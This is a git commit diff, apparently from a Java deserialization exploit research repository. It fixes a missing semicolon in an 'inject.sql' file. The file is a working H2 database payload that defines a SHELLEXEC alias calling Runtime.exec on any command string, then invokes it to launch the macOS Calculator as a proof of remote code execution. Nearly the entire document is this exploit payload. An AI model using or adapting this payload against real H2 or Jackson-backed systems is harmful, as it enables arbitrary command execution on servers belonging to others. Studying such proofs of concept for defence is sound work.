04790a2ed2ec7a3a6eadb55004b5aa499bc8a75d
threedr3am <929811313@qq.com>
2021-04-06 20:08:02 +0800

    fix h2 RCE inject.sql

--- jackson/src/main/resources/inject.sql
+++ jackson/src/main/resources/inject.sql
@@ -1,6 +1,6 @@
 CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {
 String[] command = {cmd};
-Runtime.getRuntime().exec(command)
+Runtime.getRuntime().exec(command);
 }
 $$;
 CALL SHELLEXEC('/Applications/Calculator.app/Contents/MacOS/Calculator')
